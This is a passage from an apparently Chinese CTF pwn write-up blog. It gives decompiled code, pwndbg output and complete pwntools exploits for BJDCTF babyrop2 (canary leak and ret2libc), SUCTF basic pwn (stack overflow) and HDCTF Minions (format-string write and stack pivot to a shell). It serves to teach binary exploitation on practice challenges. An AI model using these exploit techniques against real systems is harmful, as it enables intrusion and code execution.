│────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">    Arch:       amd64-64-little                                                                 │pwndbg&gt; search N1ght</span><br><span class="line">    RELRO:      Partial RELRO                                                                   │Searching <span class="keyword">for</span> byte: b<span class="string">&#x27;N1ght&#x27;</span></span><br><span class="line">    Stack:      Canary found                                                                    │[heap]          0x142e2a0 0xa746867314e /* <span class="string">&#x27;N1ght\n&#x27;</span> */</span><br><span class="line">    NX:         NX enabled                                                                      │[stack]         0x7fffc44857b0 0x746867314e /* <span class="string">&#x27;N1ght&#x27;</span> */</span><br><span class="line">    PIE:        No PIE (0x400000)                                                               │[stack]         0x7fffc4487660 0x746867314e /* <span class="string">&#x27;N1ght&#x27;</span> */</span><br><span class="line">    Stripped:   No                                                                              │[stack]         0x7fffc44878d0 0x746867314e /* <span class="string">&#x27;N1ght&#x27;</span> */</span><br><span class="line">[*] Loaded 14 cached gadgets <span class="keyword">for</span> <span class="string">&#x27;./pwn&#x27;</span>                                                        │pwndbg&gt; stack</span><br><span class="line">[*] ret addr : 0x4005f9                                                                         │00:0000│ rsp 0x7fffc44878b8 —▸ 0x4008c3 (vuln+60) ◂— nop </span><br><span class="line">[*] rdi addr : 0x400993                                                                         │01:0008│ rsi 0x7fffc44878c0 —▸ 0x7fa4fe745040 (_rtld_global) —▸ 0x7fa4fe7462e0 ◂— 0</span><br><span class="line">/home/pwn/pwn/nssctf/11.11/BJDCTF_2020_babyrop2/exp.py:7: BytesWarning: Text is not bytes; assum│02:0010│-018 0x7fffc44878c8 —▸ 0x400870 (gift+92) ◂— nop </span><br><span class="line">ing ASCII, no guarantees. See https://docs.pwntools.com/<span class="comment">#bytes                                  │03:0018│-010 0x7fffc44878d0 ◂— 0x746867314e /* &#x27;N1ght&#x27; */</span></span><br><span class="line">  def sl(a) : p.sendline(a)                                                                     │04:0020│-008 0x7fffc44878d8 ◂— 0xca0d406c4cf14500</span><br><span class="line">[*] running <span class="keyword">in</span> new terminal: [<span class="string">&#x27;/usr/bin/gdb&#x27;</span>, <span class="string">&#x27;-q&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>, <span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;7089&#x27;</span>]                      │05:0028│ rbp 0x7fffc44878e0 —▸ 0x7fffc4487900 ◂— 1</span><br><span class="line">[+] Waiting <span class="keyword">for</span> debugger: Done                                                                  │06:0030│+008 0x7fffc44878e8 —▸ 0x40090f (main+53) ◂— mov eax, 0</span><br><span class="line">[*] Paused (press any to <span class="built_in">continue</span>)                                                              │07:0038│+010 0x7fffc44878f0 ◂— 0x1000</span><br><span class="line">                                                                                                │pwndbg&gt; </span><br></pre></td></tr></table></figure>

<p>发现在下一个也就是%2加入5个寄存器就是canary值</p>
<p>大小足够泄露两个地址好找libc版本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    ip = <span class="string">&quot;node4.anna.nssctf.cn&quot;</span></span><br><span class="line">    port = <span class="number">28119</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line"><span class="comment"># clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rdi = rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">info(<span class="string">&quot;ret addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(ret))</span><br><span class="line">info(<span class="string">&quot;rdi addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(rdi))</span><br><span class="line">p.recv()</span><br><span class="line">sl(<span class="string">&quot;%7$p&quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(rl(<span class="string">&quot;00&quot;</span>)[-<span class="number">18</span>:].decode(<span class="string">&quot;utf-8&quot;</span>),<span class="number">16</span>)</span><br><span class="line">info(<span class="string">&quot;canary: &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(canary))</span><br><span class="line">offset = <span class="number">0x20</span> + <span class="number">8</span></span><br><span class="line">payload1 = flat([cyclic(offset-<span class="number">0x10</span>),canary,<span class="number">0xdeaf</span>,rdi,elf.got[<span class="string">&#x27;puts&#x27;</span>],elf.plt[<span class="string">&#x27;puts&#x27;</span>]],rdi,elf.got[<span class="string">&#x27;read&#x27;</span>],elf.plt[<span class="string">&#x27;puts&#x27;</span>],elf.sym[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line">sl(payload1)</span><br><span class="line">puts_addr = get_addr()</span><br><span class="line">read_addr = get_addr()</span><br><span class="line">info(<span class="string">&quot;puts addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(puts_addr))</span><br><span class="line">info(<span class="string">&quot;read addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(read_addr))</span><br><span class="line">libc_base = puts_addr - <span class="number">0x6f690</span></span><br><span class="line">system = libc_base + <span class="number">0x45390</span></span><br><span class="line">bin_sh = libc_base + <span class="number">0x18cd57</span></span><br><span class="line">payload2 = flat([cyclic(offset-<span class="number">0x10</span>),canary,<span class="number">0xdeaf</span>,rdi,bin_sh,system])</span><br><span class="line">sl(payload2)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h3 id="SUCTF-2018-招新赛-basic-pwn"><a href="#SUCTF-2018-招新赛-basic-pwn" class="headerlink" title="[SUCTF 2018 招新赛]basic pwn"></a>[SUCTF 2018 招新赛]basic pwn</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">268</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+11Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hi %s\n&quot;</span>, s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">callThisFun</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *path[<span class="number">4</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  path[<span class="number">0</span>] = <span class="string">&quot;/bin/cat&quot;</span>;</span><br><span class="line">  path[<span class="number">1</span>] = <span class="string">&quot;flag.txt&quot;</span>;</span><br><span class="line">  path[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> execve(<span class="string">&quot;/bin/cat&quot;</span>, path, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很简单一个溢出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    ip = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">    port = <span class="number">1111</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line"><span class="comment"># clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rdi = rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">info(<span class="string">&quot;ret addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(ret))</span><br><span class="line">info(<span class="string">&quot;rdi addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(rdi))</span><br><span class="line">offset = <span class="number">0x110</span> + <span class="number">8</span></span><br><span class="line">payload1 = flat([cyclic(offset),<span class="number">0x401157</span>])</span><br><span class="line"></span><br><span class="line">sl(payload1)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h3 id="HDCTF-2023-Minions"><a href="#HDCTF-2023-Minions" class="headerlink" title="[HDCTF 2023]Minions"></a>[HDCTF 2023]Minions</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nDo you have an invitation key?&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( key == <span class="number">102</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;welcome,tell me more about you&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x40</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;That&#x27;s great.Do you like Minions?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;hdctf, <span class="number">0x28</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;sorry,you can&#x27;t in&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>key在bss段上<code>0x0000000006010A0</code>​</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">208</span>]; <span class="comment">// [rsp+0h] [rbp-D0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to HDCTF.What you name?\n&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0xD0</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存在格式化字符串</p>
<p>可以打栈迁移，当前old_ebp保存了old_ebp的地址，我们可以泄露出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    ip = <span class="string">&quot;node5.anna.nssctf.cn&quot;</span></span><br><span class="line">    port = <span class="number">22952</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line"><span class="comment"># clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rdi = rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">leave = rop.find_gadget([<span class="string">&#x27;leave&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">info(<span class="string">&quot;ret addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(ret))</span><br><span class="line">info(<span class="string">&quot;rdi addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(rdi))</span><br><span class="line">info(<span class="string">&quot;leave addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(leave))</span><br><span class="line">key = <span class="number">0x0000000006010A0</span></span><br><span class="line">offset = <span class="number">0x30</span> + <span class="number">8</span></span><br><span class="line">payload1 = fmtstr_payload(<span class="number">6</span>,&#123;key:<span class="number">102</span>&#125;)</span><br><span class="line">r()</span><br><span class="line">sl(payload1)</span><br><span class="line">r()</span><br><span class="line">payload2 = flat([cyclic(offset),<span class="number">0x400610</span>])</span><br><span class="line">sl(payload2)</span><br><span class="line">sl(<span class="string">&quot;%32$p&quot;</span>)</span><br><span class="line">rl(<span class="string">&quot;Hello,&quot;</span>)</span><br><span class="line">fake_ebp = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;\n\n&quot;</span>,drop=<span class="literal">True</span>).decode(<span class="string">&quot;utf-8&quot;</span>),<span class="number">16</span>) - <span class="number">0x28</span></span><br><span class="line">success(<span class="string">&quot;fake_ebp: &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(fake_ebp))</span><br><span class="line">bin_sh = fake_ebp - <span class="number">8</span></span><br><span class="line">success(<span class="string">&quot;fake_ebp: &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(fake_ebp))</span><br><span class="line">success(<span class="string">&quot;bin_sh: &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(bin_sh))</span><br><span class="line">payload3 = flat([<span class="string">&quot;/bin/sh\x00&quot;</span>,ret,rdi,bin_sh,elf.sym[<span class="string">&#x27;system&#x27;</span>],])</span><br><span class="line">payload3 = payload3.ljust(offset-<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(fake_ebp-<span class="number">8</span>) + p64(leave) </span><br><span class="line">sl(payload3)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<p>格式化字符串</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 